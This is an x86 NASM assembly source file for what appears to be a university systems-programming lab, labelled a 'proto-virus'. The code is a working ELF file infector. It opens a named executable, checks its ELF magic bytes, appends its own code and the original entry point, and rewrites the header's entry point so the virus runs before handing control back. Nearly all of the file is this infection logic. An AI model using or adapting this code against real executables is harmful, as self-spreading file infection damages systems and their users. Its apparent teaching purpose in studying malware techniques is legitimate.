%macro	syscall1 2
	mov	ebx, %2
	mov	eax, %1
	int	0x80
%endmacro

%macro	syscall3 4
	mov	edx, %4
	mov	ecx, %3
	mov	ebx, %2
	mov	eax, %1
	int	0x80
%endmacro

%macro  exit 1
	syscall1 1, %1
%endmacro

%macro  write 3
	syscall3 4, %1, %2, %3
%endmacro

%macro  read 3
	syscall3 3, %1, %2, %3
%endmacro

%macro  open 3
	syscall3 5, %1, %2, %3
%endmacro

%macro  lseek 3
	syscall3 19, %1, %2, %3
%endmacro

%macro  close 1
	syscall1 6, %1
%endmacro

%macro get_loc 1
	call get_my_loc
	sub dword [ebp - LABEL_OFF],  next_i - %1
%endmacro

%define	STK_RES	200
%define	RDWR	2
%define	SEEK_END 2
%define SEEK_SET 0

%define ENTRY		24
%define PHDR_start	28
%define	PHDR_size	32
%define PHDR_memsize	20	
%define PHDR_filesize	16
%define	PHDR_offset	4
%define	PHDR_vaddr	8
%define ELFHD_offset 64
%define FILE_SIZE_OFF 68
%define MAGIC1 7
%define MAGIC2 6
%define MAGIC3 5
%define ENTRY_OFF 40
%define FD_OFFSET 4
%define LABEL_OFF 12
%define MAGIC_OFF 8
%define UNIX_VIR_ADD 0x08048000
	
	global _start

	section .text
_start:
    push	ebp
	mov	ebp, esp
	sub	esp, STK_RES            ; Set up ebp and reserve space on the stack for local storage
	

; You code for this lab goes here
	get_loc OutStr
	write 1, [ebp - LABEL_OFF], 32
	get_loc FileName
	open [ebp - LABEL_OFF], RDWR, 0
	cmp eax, -1
	je virus_fail
	mov dword [ebp - FD_OFFSET], eax

	mov dword [ebp - MAGIC_OFF], 0
	lea ecx, [ebp - MAGIC_OFF]
	read [ebp - FD_OFFSET], ecx, 4
	cmp eax, 4
	jl virus_fail
	mov dword ecx, [ecx]
	cmp dword ecx, 0x464c457f
	jnz virus_fail

	lseek [ebp - FD_OFFSET], 0, SEEK_END
	mov dword [ebp - FILE_SIZE_OFF], eax
	get_loc _start
	mov ecx, [ebp - LABEL_OFF]
	get_loc virus_end
	mov edx, [ebp - LABEL_OFF]
	sub edx, ecx
	sub edx, 4
	write [ebp - FD_OFFSET], ecx, edx

	lseek [ebp - FD_OFFSET], 0, SEEK_SET
	lea ecx, [ebp - ELFHD_offset]
	read [ebp - FD_OFFSET], ecx, 52

	lseek [ebp - FD_OFFSET], 0, SEEK_END
	lea eax, [ebp - ENTRY_OFF]
	write [ebp - FD_OFFSET], eax, 4

	mov eax, dword [ebp - FILE_SIZE_OFF]
	mov dword [ebp - ENTRY_OFF], UNIX_VIR_ADD
	add dword [ebp - ENTRY_OFF], eax
	lseek [ebp - FD_OFFSET], 0, SEEK_SET
	lea ecx, [ebp - ELFHD_offset]
	write [ebp - FD_OFFSET], ecx, 52



	close [ebp - FD_OFFSET]

	get_loc PreviousEntryPoint
	mov eax, [ebp - LABEL_OFF]
	mov eax, [eax]
	jmp eax

virus_fail:
	get_loc Failstr
	write 1, [ebp - LABEL_OFF], 13

	get_loc PreviousEntryPoint
	mov eax, [ebp - LABEL_OFF]
	mov eax, [eax]
	jmp eax

VirusExit:
       exit 0            ; Termination if all is OK and no previous code to jump to
                         ; (also an example for use of above macros)
	
FileName:	db "ELFexec2short", 0
OutStr:		db "The lab 9 proto-virus strikes!", 10, 0
Failstr:        db "perhaps not", 10 , 0

get_my_loc:
	call next_i
next_i:
	pop dword [ebp - LABEL_OFF]
	ret
	
PreviousEntryPoint: dd VirusExit
virus_end:


